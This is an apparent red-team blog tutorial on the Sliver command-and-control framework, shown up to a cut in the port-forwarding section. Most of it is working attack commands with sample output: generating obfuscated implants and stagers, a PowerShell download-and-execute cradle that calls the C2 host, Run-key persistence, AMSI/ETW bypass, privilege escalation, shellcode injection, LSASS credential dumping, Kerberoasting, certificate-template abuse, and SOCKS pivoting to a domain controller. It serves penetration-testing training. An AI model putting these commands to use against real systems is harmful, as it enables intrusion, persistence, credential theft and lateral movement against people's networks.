---
title: "Sliver C2 Deep Dive: Complete Red Team Field Guide"
date: 2026-03-19 00:00:00 +0000
categories: [Red Team, C2]
tags: [sliver, c2, command-and-control, red-team, post-exploitation, pivoting, bof, armory, evasion, mtls, wireguard, dns-c2, lateral-movement]
description: "A comprehensive red team guide to Sliver C2 — installation, implant generation, all transport protocols, post-exploitation, BOF, armory, pivoting, evasion, and real attack scenarios with full commands."
image:
  path: /assets/img/posts/sliver-c2/banner.png
toc: true
---

## What Is Sliver?

[Sliver](https://github.com/BishopFox/sliver) is an open-source, cross-platform adversary emulation and C2 framework written in Go, developed by Bishop Fox. It is one of the most actively used C2 frameworks in professional red team engagements today — and is increasingly seen in real intrusions by threat actors including **APT29 (Cozy Bear/SVR)** and BumbleBee loader campaigns.

**Why Sliver over Cobalt Strike?**

| Feature | Sliver | Cobalt Strike |
|---------|--------|---------------|
| Cost | Free / Open Source | ~$3,500/year |
| Language | Go (cross-compiled) | Java |
| Transport protocols | mTLS, WireGuard, HTTP/S, DNS | HTTP/S, DNS, SMB, TCP |
| Built-in OPSEC | Symbol obfuscation, Garble | Malleable C2 profiles |
| Multiplayer | Yes (gRPC/mTLS) | Yes (team server) |
| BOF support | Yes (coff-loader) | Yes (native) |
| Platform | Windows, Linux, macOS implants | Windows primary |
| .NET execution | execute-assembly (Donut) | execute-assembly |
| APT usage | APT29, BumbleBee, DEV-0237 | Historically popular |

Lab environment used throughout this blog:

| Role | Value |
|------|-------|
| Attacker / C2 Server | Kali Linux — `10.10.14.55` |
| Victim 1 | Windows 10/11 — `10.129.229.224` (user: `eliot`) |
| Victim 2 (pivot target) | Windows Server 2022 DC — `10.129.229.10` (internal) |
| Domain | `inlanefreight.local` |
| Attacker user | `hossam` / `HossamR3dT3am!` |
| Shell prompt | `root@root$` |

---

## Architecture Overview

```
┌─────────────────────────────────────────────────┐
│                SLIVER ECOSYSTEM                  │
│                                                  │
│  ┌──────────────┐  gRPC/mTLS  ┌──────────────┐  │
│  │ sliver-client│ ──────────► │ sliver-server│  │
│  │  (operator)  │  TCP 31337  │  (team srvr) │  │
│  └──────────────┘             └──────┬───────┘  │
│                                      │           │
│                              C2 Protocols:       │
│                       mTLS / WireGuard / HTTP/S  │
│                       DNS / TCP                  │
│                                      │           │
│                               ┌──────▼───────┐   │
│                               │   IMPLANT    │   │
│                               │ (sliver.exe) │   │
│                               │  on victim   │   │
│                               └──────────────┘   │
└─────────────────────────────────────────────────┘
```

**Key components:**

| Component | Description |
|-----------|-------------|
| `sliver-server` | The C2 server binary — manages implants, listeners, database, gRPC API |
| `sliver-client` | Operator console — connects to server via gRPC/mTLS on TCP 31337 |
| Implant (sliver) | The beacon/session compiled binary running on the victim |
| Listeners | Server-side protocol handlers (mTLS, WireGuard, HTTP/S, DNS) |
| Armory | Package manager for extensions, aliases, BOFs |

**Implant modes:**

| Mode | Behavior | Use Case |
|------|----------|----------|
| **Session** | Real-time persistent connection | Active interactive work, pivoting, SOCKS5 |
| **Beacon** | Async check-in at intervals with jitter | Long-term access, OPSEC-sensitive ops |

---

## Installation

### Option 1 — Linux Install Script (Recommended, Systemd Service)

```bash
# Download and run the official installer
root@root$ curl https://sliver.sh/install | sudo bash

# The installer:
# - Installs sliver-server to /usr/local/bin/sliver-server
# - Installs sliver-client to /usr/local/bin/sliver
# - Creates systemd service: sliver (auto-starts on boot)
# - Generates first-run certs, keys, and SQLite database

# Verify service is running
root@root$ sudo systemctl status sliver
root@root$ sudo systemctl enable sliver

# Start interactive server console (single-operator mode)
root@root$ sliver-server
```

### Option 2 — Manual Binary Download

```bash
# Download latest release from GitHub
root@root$ wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -O /usr/local/bin/sliver-server
root@root$ wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux -O /usr/local/bin/sliver
root@root$ chmod +x /usr/local/bin/sliver-server /usr/local/bin/sliver

# First run — generates config, certs, db
root@root$ sliver-server
[*] Loading configs from /root/.sliver/configs/server.json
[*] Starting gRPC server ...
[*] Loaded 0 implant build(s)

          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
               ░      ░  ░ ░      ░     ░  ░   ░

        All hackers gain .DEATHTOUCH
        https://github.com/BishopFox/sliver

        [*] Server v1.5.x  - ...
```

### Option 3 — Docker

```bash
root@root$ docker pull ghcr.io/bishopfox/sliver:latest
root@root$ docker run -it --rm -p 443:443 -p 80:80 -p 31337:31337 \
    -v /tmp/sliver:/root/.sliver \
    ghcr.io/bishopfox/sliver:latest
```

### Post-Install: Armory Setup

The Armory is Sliver's package manager for BOFs, .NET tools, and aliases.

```
[server] sliver > armory install all
[*] Installing 'Rubeus' (v2.3.2) ... done
[*] Installing 'Seatbelt' (v1.2.1) ... done
[*] Installing 'SharpHound' (v2.4.0) ... done
[*] Installing 'nanodump' (v1.3.0) ... done
[*] Installing 'mimikatz' (v2.2.0-20220919) ... done
[*] Installing 'coff-loader' (v0.0.3) ... done
[*] Installing 'SharpView' (v1.0.1) ... done
[*] Installing 'Certify' (v1.1.0) ... done
...

# Or install specific packages
[server] sliver > armory install nanodump
[server] sliver > armory install Rubeus
[server] sliver > armory install coff-loader
```

---

## Multiplayer Mode (Team Server)

Multiplayer mode lets multiple operators connect to the same Sliver server simultaneously.

### Server-Side: Create Operators

```bash
# On the server console — generate operator config files
[server] sliver > new-operator --name hossam --lhost 10.10.14.55
[*] Generating new operator config for hossam@10.10.14.55 ...
[*] Saved operator config to /root/hossam_10.10.14.55.cfg

[server] sliver > new-operator --name eliot --lhost 10.10.14.55
[*] Saved operator config to /root/eliot_10.10.14.55.cfg

# Start the multiplayer RPC listener (TCP 31337)
[server] sliver > multiplayer
[*] Multiplayer mode enabled!
```

If running as a systemd service (daemon mode), generate configs via CLI:

```bash
root@root$ sliver-server operator --name hossam --lhost 10.10.14.55 --save /tmp/hossam.cfg
root@root$ sliver-server operator --name teammate2 --lhost 10.10.14.55 --save /tmp/t2.cfg
```

### Client-Side: Connect to Team Server

```bash
# Install config and connect (operator machine)
root@root$ mkdir -p ~/.sliver-client/configs
root@root$ cp hossam_10.10.14.55.cfg ~/.sliver-client/configs/

# Connect
root@root$ sliver
[*] Connecting to 10.10.14.55:31337 ...
[*] Connected to server (hossam@10.10.14.55)

          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
        [... banner ...]

[server] sliver >
```

---

## Listeners (C2 Protocols)

Before generating any implant, you need a listener running on the server.

### mTLS Listener (Most Secure — Recommended)

Mutual TLS: both client and server authenticate with X.509 certificates. Encrypted, authenticated channel.

```
[server] sliver > mtls
[*] Starting mTLS listener ...
[*] Successfully started job #1

[server] sliver > jobs
 ID  Name  Protocol  Port
====  ====  ========  ====
  1  mtls  tcp        8888
```

Custom port:

```
[server] sliver > mtls --lport 443
```

### HTTPS Listener (Best for Firewall Bypass)

```
[server] sliver > https
[*] Starting HTTPS/TLS listener ...
[*] Successfully started job #2

# Custom port + domain
[server] sliver > https --lport 443 --domain updates.microsoft-cdn.net

# With Let's Encrypt certificate (for real engagements)
[server] sliver > https --lport 443 --domain yourdomain.com --lets-encrypt
```

### HTTP Listener

```
[server] sliver > http
[*] Starting HTTP listener ...
[*] Successfully started job #3

[server] sliver > http --lport 8080
```

### DNS Listener (Firewall Tunnelling)

DNS-based C2 encodes data in DNS queries. Extremely stealthy — bypasses most egress firewalls since UDP/53 is almost always allowed.

```
# Prerequisite: set up a DNS A record pointing c2.yourdomain.com → 10.10.14.55
# Set up NS record: ns1.yourdomain.com → 10.10.14.55
# (so DNS queries for *.c2.yourdomain.com are forwarded to our server)

[server] sliver > dns --domains c2.inlanefreight.local --lport 53
[*] Starting DNS listener ...
[*] Successfully started job #4
```

### WireGuard Listener (VPN Tunnel)

Creates a WireGuard VPN tunnel between implant and server. Extremely stable and stealthy.

```
[server] sliver > wg
[*] Starting WireGuard listener ...
[*] Successfully started job #5

# Default: UDP 51820
[server] sliver > wg --lport 51820
```

### Managing Listeners

```
[server] sliver > jobs
 ID  Name   Protocol  Port
====  =====  ========  =====
  1  mtls   tcp        8888
  2  https  tcp        443
  3  http   tcp        80
  4  dns    udp        53
  5  wg     udp        51820

# Kill a listener
[server] sliver > jobs --kill 3
```

---

## Generating Implants

### Beacon vs Session: When to Use Each

```
BEACON mode (--beacon):
  ✓ Async check-in every N seconds + jitter
  ✓ OPSEC-friendly — low network noise
  ✓ Goes dark between check-ins
  ✗ Commands queue and execute on next check-in
  ✗ Cannot host SOCKS5 proxy or port forwards
  → Use for: long-term access, initial compromise, blending in

SESSION mode (no --beacon flag):
  ✓ Real-time interactive shell
  ✓ Can host SOCKS5 proxy and port forwards
  ✓ Immediate command execution
  ✗ Higher network noise (heartbeat every few seconds)
  → Use for: active post-exploitation, pivoting, lateral movement
```

### Generate: mTLS Beacon (Windows x64 EXE)

```
[server] sliver > generate beacon --mtls 10.10.14.55 --os windows --arch amd64 --format exe --seconds 30 --jitter 10 --save /var/www/html/
[*] Generating new windows/amd64 beacon implant binary (30s)
[*] Symbol obfuscation is enabled
[*] Build completed in 00:01:12
[*] Implant saved to /var/www/html/STEALTHY_WATCHER.exe
```

**Flag breakdown:**

| Flag | Description |
|------|-------------|
| `--mtls 10.10.14.55` | C2 server address (mTLS protocol) |
| `--os windows` | Target OS: windows, linux, darwin |
| `--arch amd64` | Architecture: amd64, 386, arm64 |
| `--format exe` | Output: exe, shared (DLL), service, shellcode |
| `--seconds 30` | Beacon check-in interval (seconds) |
| `--jitter 10` | Add up to 10s random delay (anti-beacon detection) |
| `--save /path/` | Where to save the output |

### Generate: HTTPS Session (Windows x64 EXE)

```
[server] sliver > generate --https 10.10.14.55 --os windows --arch amd64 --format exe --save /var/www/html/
[*] Generating new windows/amd64 session implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 00:01:05
[*] Implant saved to /var/www/html/EAGER_COBRA.exe
```

### Generate: Shellcode (for custom loaders)

```
[server] sliver > generate beacon --mtls 10.10.14.55 --os windows --arch amd64 --format shellcode --save /tmp/
[*] Implant saved to /tmp/FAST_TIGER.bin
```

### Generate: Shared Library (DLL)

```
[server] sliver > generate beacon --mtls 10.10.14.55 --os windows --arch amd64 --format shared --save /tmp/
[*] Implant saved to /tmp/DARK_FALCON.dll
```

### Generate: Windows Service Binary

Used with PsExec-style lateral movement — the binary registers itself as a Windows service.

```
[server] sliver > generate beacon --mtls 10.10.14.55 --os windows --arch amd64 --format service --save /tmp/
[*] Implant saved to /tmp/COLD_MIST.exe
```

### Generate: DNS Beacon

```
[server] sliver > generate beacon --dns c2.inlanefreight.local --os windows --arch amd64 --save /tmp/
```

### Generate: WireGuard Beacon

```
[server] sliver > generate beacon --wg 10.10.14.55 --os windows --arch amd64 --save /tmp/
```

### Generate: Multi-Protocol Implant (Failover)

Compile multiple C2 protocols into one implant — it tries them in order on connect failure:

```
[server] sliver > generate beacon --mtls 10.10.14.55 --https 10.10.14.55 --http 10.10.14.55 --os windows --arch amd64 --save /tmp/
# Implant tries: mTLS:8888 → HTTPS:443 → HTTP:80
```

### Generate: Linux Implant

```
[server] sliver > generate beacon --mtls 10.10.14.55 --os linux --arch amd64 --format elf --save /tmp/
[*] Implant saved to /tmp/SHADOW_TIGER
```

### Generate: macOS Implant

```
[server] sliver > generate beacon --mtls 10.10.14.55 --os darwin --arch amd64 --save /tmp/
```

### Profiles: Save and Reuse Implant Config

Profiles save your generation options so you don't retype them:

```
# Create a profile
[server] sliver > profiles new beacon --mtls 10.10.14.55 --os windows --arch amd64 --format exe --seconds 30 --jitter 10 my-win-beacon

[server] sliver > profiles new --https 10.10.14.55 --os windows --arch amd64 --format shellcode my-shellcode

# List profiles
[server] sliver > profiles
 Profile Name      Platform        Command & Control  Implant Type  Format
==============  ==============  ===================  ============  ========
 my-win-beacon  windows/amd64  [mtls://10.10.14.55]   beacon       exe
 my-shellcode   windows/amd64  [https://10.10.14.55]  session      shellcode

# Generate from profile
[server] sliver > profiles generate my-win-beacon --save /var/www/html/
[*] Implant saved to /var/www/html/PROUD_DRAGON.exe

# Generate shellcode from profile with shikata ga nai encoding
[server] sliver > profiles generate --save /tmp/ my-shellcode
? Encode shellcode with shikata ga nai? Yes
[*] Encoding shellcode with shikata ga nai ... success!
[*] Implant saved to /tmp/HUNGRY_RUNAWAY.bin
```

---

## Staged vs Stageless Implants

### Stageless (Default)

A single binary containing everything needed to establish C2. Larger in size but simpler deployment.

```
# Everything above generates stageless payloads by default
generate beacon --mtls 10.10.14.55 --format exe
```

### Staged (Two-Stage — Better Evasion)

**Stage 1:** A tiny stager (~few KB) that calls back to the C2 and downloads the full implant in-memory.
**Stage 2:** The full Sliver beacon, served by the stage listener, executed entirely in memory.

```
# Step 1: Create an implant profile (this defines the stage 2)
[server] sliver > profiles new beacon --http 10.10.14.55:8999 --os windows --arch amd64 --format shellcode --skip-symbols staged-profile

# Step 2: Start the HTTP listener for callbacks
[server] sliver > http --lport 80

# Step 3: Start a stage listener to serve the implant shellcode
[server] sliver > stage-listener --url http://10.10.14.55:8999 --profile staged-profile
[*] Starting HTTP stage listener on 0.0.0.0:8999

# Step 4: Generate the stager (tiny dropper shellcode)
[server] sliver > generate stager --lhost 10.10.14.55 --lport 8999 --arch amd64 --format csharp --save /tmp
[*] Sliver implant stager saved to: /tmp/BAD_PURITAN
```

**Stage 1 execution flow:**
```
Victim executes tiny stager
  └─ Stager connects to 10.10.14.55:8999
        └─ Downloads full beacon shellcode into memory
              └─ Injects and executes shellcode in-process
                    └─ Full Sliver beacon calls back to 10.10.14.55:80
                          └─ Session/Beacon established
```

---

## Receiving and Interacting with Implants

### Deliver the Payload

```bash
# Option 1: Host via Python HTTPS
root@root$ cd /var/www/html
root@root$ python3 -m http.server 8080

# Option 2: SMB share (for internal delivery)
root@root$ impacket-smbserver share /var/www/html/ -smb2support

# Victim download command
# PowerShell one-liner (victim executes this):
# IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.55/STEALTHY_WATCHER.exe','C:\Windows\Temp\update.exe'); Start-Process 'C:\Windows\Temp\update.exe'
```

### Receiving a Beacon

When the implant executes on the victim, the server console shows:

```
[*] Beacon STEALTHY_WATCHER - 10.129.229.224:50123 (DESKTOP-WIN11) - windows/amd64 - Thu, 19 Mar 2026 23:30:00 EET

[server] sliver > beacons
 ID         Name              Transport  Hostname       Username  PID    Last Check-In  Next Check-In
==========  ================  =========  =============  ========  =====  =============  =============
 a1b2c3d4   STEALTHY_WATCHER  mtls       DESKTOP-WIN11  eliot     4832   just now       29s
```

### Receiving a Session

```
[*] Session EAGER_COBRA - 10.129.229.224:50456 (DESKTOP-WIN11) - windows/amd64 - Thu, 19 Mar 2026 23:31:00 EET

[server] sliver > sessions
 ID         Name         Transport  Hostname       Username  PID    Last Check-In
==========  ===========  =========  =============  ========  =====  =============
 b5c6d7e8   EAGER_COBRA  https      DESKTOP-WIN11  eliot     3920   just now
```

### Interacting with a Beacon

```
# Use beacon by ID (partial ID works)
[server] sliver > use a1b2
[*] Active beacon STEALTHY_WATCHER (a1b2c3d4)

[server] sliver (STEALTHY_WATCHER) > whoami
[*] Tasked beacon STEALTHY_WATCHER (task: abc123)
[+] STEALTHY_WATCHER completed task abc123

inlanefreight\eliot

[server] sliver (STEALTHY_WATCHER) > info
        Beacon ID: a1b2c3d4-...
          Beacon Name: STEALTHY_WATCHER
             Hostname: DESKTOP-WIN11
         Remote Addr: 10.129.229.224:50123
              OS/Arch: windows/amd64
                  PID: 4832
                 User: inlanefreight\eliot
         Active C2:  mtls://10.10.14.55:8888
    Check-In Interval: 30s (jitter: 10s)
```

### Convert Beacon → Interactive Session

```
[server] sliver (STEALTHY_WATCHER) > interactive
[*] Using same C2 endpoint mTLS...
[*] Tasked beacon to open session...
[+] Session STEALTHY_WATCHER opened

# Now in session mode — real-time
[server] sliver (STEALTHY_WATCHER) > whoami
inlanefreight\eliot
```

---

## Core Post-Exploitation Commands

Once you have a session or beacon, these are your most-used commands.

### System Information

```
sliver (STEALTHY_WATCHER) > info           # implant info
sliver (STEALTHY_WATCHER) > whoami         # current user + groups
sliver (STEALTHY_WATCHER) > getuid         # UID/SID
sliver (STEALTHY_WATCHER) > getgid
sliver (STEALTHY_WATCHER) > hostname       # machine name
sliver (STEALTHY_WATCHER) > ifconfig       # network interfaces
sliver (STEALTHY_WATCHER) > netstat        # active connections
sliver (STEALTHY_WATCHER) > ps             # process list
sliver (STEALTHY_WATCHER) > env            # environment variables
sliver (STEALTHY_WATCHER) > screenshot     # take screenshot (saved locally)
```

**Sample output:**

```
sliver (STEALTHY_WATCHER) > ps

 PID    PPID   Arch   Owner                  Executable
======  =====  =====  =====================  ========================
 4      0      x64    NT AUTHORITY\SYSTEM    System
 ...
 628    492    x64    NT AUTHORITY\SYSTEM    lsass.exe
 1340   728    x64    inlanefreight\eliot    explorer.exe
 4832   1340   x64    inlanefreight\eliot    STEALTHY_WATCHER.exe
 5012   1340   x64    inlanefreight\eliot    chrome.exe
```

### File Operations

```
sliver (STEALTHY_WATCHER) > ls                         # list current directory
sliver (STEALTHY_WATCHER) > ls C:\Users\eliot\Desktop  # list specific path
sliver (STEALTHY_WATCHER) > pwd                        # print working directory
sliver (STEALTHY_WATCHER) > cd C:\Users\eliot          # change directory
sliver (STEALTHY_WATCHER) > cat C:\Users\eliot\secrets.txt  # read file
sliver (STEALTHY_WATCHER) > download C:\Users\eliot\Desktop\passwords.txt  # download to C2
sliver (STEALTHY_WATCHER) > upload /tmp/tool.exe C:\Windows\Temp\tool.exe  # upload to victim
sliver (STEALTHY_WATCHER) > rm C:\Windows\Temp\tool.exe  # delete file
sliver (STEALTHY_WATCHER) > mkdir C:\Windows\Temp\new_folder  # create directory
sliver (STEALTHY_WATCHER) > mv C:\old.txt C:\new.txt   # move/rename file
```

### Shell Execution

```
# Run a shell command and get output
sliver (STEALTHY_WATCHER) > shell           # interactive shell (noisy — avoid)
sliver (STEALTHY_WATCHER) > execute -o whoami             # run command, get output
sliver (STEALTHY_WATCHER) > execute -o "net localgroup administrators"
sliver (STEALTHY_WATCHER) > execute -o "net group 'Domain Admins' /domain"
sliver (STEALTHY_WATCHER) > execute -o "ipconfig /all"
sliver (STEALTHY_WATCHER) > execute -o "arp -a"
sliver (STEALTHY_WATCHER) > execute -o "netstat -ano"

# PowerShell
sliver (STEALTHY_WATCHER) > execute -o powershell -c "Get-ADUser -Filter * | Select Name,SamAccountName"
sliver (STEALTHY_WATCHER) > execute -o powershell -c "Get-Process | Sort CPU -Descending | Select -First 20"
```

### Registry Operations

```
sliver (STEALTHY_WATCHER) > registry read --hive HKCU --path "Software\Microsoft\Windows\CurrentVersion\Run"
sliver (STEALTHY_WATCHER) > registry write --hive HKCU --path "Software\Microsoft\Windows\CurrentVersion\Run" --key "Updater" --string "C:\Windows\Temp\beacon.exe"
sliver (STEALTHY_WATCHER) > registry delete --hive HKCU --path "Software\Microsoft\Windows\CurrentVersion\Run" --key "Updater"
```

---

## Scenario 1: Initial Access → System

**Goal:** Get from domain user `eliot` to SYSTEM on `DESKTOP-WIN11`

### Step 1: Deploy beacon, confirm access

```
# Victim executes payload (delivered via phishing/VBS/HTA)
# Beacon checks in:
[*] Beacon STEALTHY_WATCHER - 10.129.229.224 (DESKTOP-WIN11) - windows/amd64

[server] sliver > use a1b2
sliver (STEALTHY_WATCHER) > whoami
inlanefreight\eliot

sliver (STEALTHY_WATCHER) > getprivs
SeShutdownPrivilege                           - Disabled
SeChangeNotifyPrivilege                       - Enabled
SeUndockPrivilege                             - Disabled
```

### Step 2: Convert to interactive session

```
sliver (STEALTHY_WATCHER) > interactive
[+] Session STEALTHY_WATCHER opened
```

### Step 3: Local enumeration

```
sliver (STEALTHY_WATCHER) > execute -o whoami /all
sliver (STEALTHY_WATCHER) > execute -o net localgroup administrators
sliver (STEALTHY_WATCHER) > execute -o systeminfo
```

### Step 4: Run Seatbelt for full host recon (via execute-assembly)

```
sliver (STEALTHY_WATCHER) > execute-assembly --process notepad.exe --ppid 1340 /opt/tools/Seatbelt.exe -group=system
[*] Output:
====== AMSIProviders ======
  GUID: {2781761E-28E0-4109-99FE-B9D127C57AFE}
  ProviderPath: "C:\ProgramData\Microsoft\Windows Defender\..."
====== AutoRuns ======
  ...
====== LocalUsers ======
  ...
====== SePrivileges ======
  ...
```

### Step 5: Privilege Escalation (getsystem)

```
# getsystem attempts multiple token impersonation techniques
sliver (STEALTHY_WATCHER) > getsystem
[*] A new SYSTEM session has been opened!
[*] Session IRON_GHOST opened (SYSTEM on DESKTOP-WIN11)
```

If `getsystem` fails, use GodPotato via execute-assembly:

```bash
# Attacker: generate shellcode for a new beacon
root@root$ # In sliver:
# generate --mtls 10.10.14.55 --os windows --arch amd64 --format shellcode --save /tmp/sys_beacon.bin
```

```
# In session: use GodPotato to execute shellcode as SYSTEM
sliver (STEALTHY_WATCHER) > execute-assembly --process notepad.exe /opt/tools/GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\sys_beacon.exe"
# Or inject shellcode
sliver (STEALTHY_WATCHER) > execute-shellcode --pid 628 /tmp/sys_beacon.bin
```

### Step 6: Migrate to SYSTEM process

```
sliver (STEALTHY_WATCHER) > ps | grep -i winlogon
 500   492  x64  NT AUTHORITY\SYSTEM  winlogon.exe

sliver (STEALTHY_WATCHER) > migrate --pid 500
[*] Successfully migrated to process 500 (winlogon.exe)
[*] New session IRON_GHOST opened under SYSTEM
```

---

## Credential Dumping

### Method 1: procdump + Mimikatz offline

```
# Dump LSASS to file
sliver (STEALTHY_WATCHER) > procdump --pid 628
[*] Process dump saved to: /tmp/lsass.dmp

# Parse offline with pypykatz (attacker machine)
root@root$ pip3 install pypykatz
root@root$ pypykatz lsa minidump /tmp/lsass.dmp
...
== MSV ==
    Username: eliot
    Domain: INLANEFREIGHT
    NT: 5f4dcc3b5aa765d61d8327deb882cf99
    LM: aad3b435b51404eeaad3b435b51404ee
    SHA1: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
== WDigest ==
    username: eliot
    password: Password123!
```

### Method 2: nanodump (Armory — OPSEC Friendly)

nanodump dumps LSASS without touching the filesystem in a standard way.

```
[server] sliver > armory install nanodump
[server] sliver > use a1b2
sliver (STEALTHY_WATCHER) > nanodump
[*] Dumping LSASS ...
[*] Dump saved to loot: nanodump_lsass.dmp

# Parse locally
root@root$ pypykatz lsa minidump /root/.sliver/loot/nanodump_lsass.dmp
```

### Method 3: hashdump

```
sliver (STEALTHY_WATCHER) > hashdump
[*] Tasked beacon STEALTHY_WATCHER
[+] Completed task

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
eliot:1001:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
```

### Method 4: Mimikatz via execute-assembly

```
sliver (STEALTHY_WATCHER) > execute-assembly --in-process --amsi-bypass --etw-bypass /opt/tools/mimikatz.exe "sekurlsa::logonpasswords" "exit"
[*] Output:
Authentication Id : 0 ; 1234567 (00000000:0012d687)
Session           : Interactive from 1
User Name         : eliot
Domain            : INLANEFREIGHT
Logon Server      : DC01
         * Username : eliot
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Password123!
```

### Method 5: Kerberoasting via Rubeus

```
sliver (STEALTHY_WATCHER) > rubeus kerberoast /nowrap /format:hashcat
[*] Action: Kerberoasting

[*] Target Domain          : inlanefreight.local
[*] Searching path 'LDAP://DC01.inlanefreight.local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))'

[*] Total kerberoastable users : 3

[*] SamAccountName         : MSSQLSvc
[*] Hash                   : $krb5tgs$23$*MSSQLSvc$INLANEFREIGHT.LOCAL$...HASH...$
```

```bash
# Crack with hashcat
root@root$ hashcat -m 13100 krb5tgs.txt /usr/share/wordlists/rockyou.txt
```

---

## Process Injection and Shellcode Execution

### inject: Inject Shellcode into Existing Process

```
# List processes, find a suitable target
sliver (STEALTHY_WATCHER) > ps
...
 5012   1340   x64   inlanefreight\eliot    chrome.exe

# Inject shellcode into chrome.exe (same user — no admin needed)
sliver (STEALTHY_WATCHER) > execute-shellcode --pid 5012 /tmp/beacon.bin
[*] Injected shellcode into PID 5012
```

### execute-shellcode: Launch Shellcode in Sacrificial Process

```
# Spawn a new notepad.exe and inject shellcode into it
sliver (STEALTHY_WATCHER) > execute-shellcode --process notepad.exe /tmp/beacon.bin
```

### migrate: Move Implant to Another Process

```
# Find SYSTEM process
sliver (STEALTHY_WATCHER) > ps | grep -i "winlogon\|svchost\|lsass"

# Migrate to svchost (SYSTEM)
sliver (STEALTHY_WATCHER) > migrate --pid 892
[*] Successfully migrated to PID 892
[+] New session opened (now running as SYSTEM in svchost.exe)
```

### execute-assembly: Run .NET Assemblies In-Memory

```
# Run Seatbelt in sacrificial process (notepad.exe)
sliver (STEALTHY_WATCHER) > execute-assembly --process notepad.exe --ppid 1340 /opt/Seatbelt.exe -group=All

# Run in-process (no new process created — more OPSEC friendly)
sliver (STEALTHY_WATCHER) > execute-assembly --in-process --amsi-bypass --etw-bypass /opt/Seatbelt.exe -group=user

# Run Rubeus in-process
sliver (STEALTHY_WATCHER) > execute-assembly --in-process --amsi-bypass --etw-bypass /opt/Rubeus.exe asreproast /format:hashcat /nowrap

# Run SharpHound (AD enum)
sliver (STEALTHY_WATCHER) > execute-assembly --in-process /opt/SharpHound.exe --CollectionMethod All --ZipFileName bloodhound.zip
sliver (STEALTHY_WATCHER) > download C:\Windows\Temp\bloodhound.zip
```

---

## Scenario 2: Active Directory Enumeration

**Goal:** Enumerate AD from compromised host, find paths to Domain Admin

### Step 1: Run SharpHound

```
sliver (STEALTHY_WATCHER) > execute-assembly --in-process --amsi-bypass /opt/SharpHound.exe -c All --zipfilename bh_out.zip
[*] SharpHound completed collection
sliver (STEALTHY_WATCHER) > download C:\Windows\Temp\bh_out_20260319.zip
```

```bash
# Import into BloodHound on attacker machine
root@root$ neo4j start
root@root$ bloodhound &
# Import ZIP via drag-and-drop
```

### Step 2: SharpView for AD Recon

```
sliver (STEALTHY_WATCHER) > execute-assembly --in-process /opt/SharpView.exe Get-DomainUser -Identity eliot
sliver (STEALTHY_WATCHER) > execute-assembly --in-process /opt/SharpView.exe Get-DomainGroupMember -Identity "Domain Admins"
sliver (STEALTHY_WATCHER) > execute-assembly --in-process /opt/SharpView.exe Get-DomainComputer -Properties name,dnshostname,operatingsystem
sliver (STEALTHY_WATCHER) > execute-assembly --in-process /opt/SharpView.exe Find-DomainShare -CheckShareAccess
sliver (STEALTHY_WATCHER) > execute-assembly --in-process /opt/SharpView.exe Find-LocalAdminAccess
```

### Step 3: Certify — AD CS Enumeration

```
sliver (STEALTHY_WATCHER) > execute-assembly --in-process /opt/Certify.exe find /vulnerable
[*] Action: Find certificate templates
...
[!] Vulnerable Certificates Templates:
    CA Name                 : CA01.inlanefreight.local
    Template Name           : UserAuthentication
    Enabled                 : True
    Client Authentication   : True
    Enrollee Supplies Subject: True   ← ESC1 vulnerability!
    ...
```

```bash
# Exploit ESC1 — request cert as Administrator
sliver (STEALTHY_WATCHER) > execute-assembly --in-process /opt/Certify.exe request /ca:CA01.inlanefreight.local\CA01 /template:UserAuthentication /altname:administrator
# → Get certificate PEM
# Convert to PFX and use with Rubeus
root@root$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
sliver (STEALTHY_WATCHER) > execute-assembly --in-process /opt/Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /getcredentials /nowrap
```

---

## Pivoting and Network Tunnelling

This is where Sliver's **session mode** shines. Sessions can host SOCKS5 proxies and port forwards to reach internal networks.

### SOCKS5 Proxy (Reach Internal Hosts)

```
# Must be in SESSION mode (not beacon)
sliver (STEALTHY_WATCHER) > socks5 start --host 127.0.0.1 --port 1080
[*] Started SOCKS5 127.0.0.1:1080

# Configure proxychains on attacker machine
root@root$ cat >> /etc/proxychains4.conf << 'EOF'
[ProxyList]
socks5  127.0.0.1 1080
EOF

# Now scan/attack internal network through the proxy
root@root$ proxychains4 nmap -sT -Pn -p 445,3389,5985 10.129.229.10
root@root$ proxychains4 crackmapexec smb 10.129.229.10 -u eliot -p 'Password123!'
root@root$ proxychains4 evil-winrm -i 10.129.229.10 -u administrator -p 'Admin@123!'
root@root$ proxychains4 impacket-secretsdump administrator@10.129.229.10
```

### Port Forward (Access Specific Service)

```
# Forward DC's RDP port to localhost
sliver (STEALTHY_WATCHER) > portfwd add --remote 10.129.229.10:3389 --local 0.0.0.0:13389
[*] Port forwarding 0.0.0.0:13389 → 10.129.229.10:3389

# Connect from attacker
root@root$ xfreerdp /v:127.0.0.1:13389 /u:administrator /p:'Admin@123!' /dynamic-resolution +clipboard
```

More port forwards:

```
# Forward WinRM
sliver (STEALTHY_WATCHER) > portfwd add --remote 10.129.229.10:5985 --local 0.0.0.0:15985
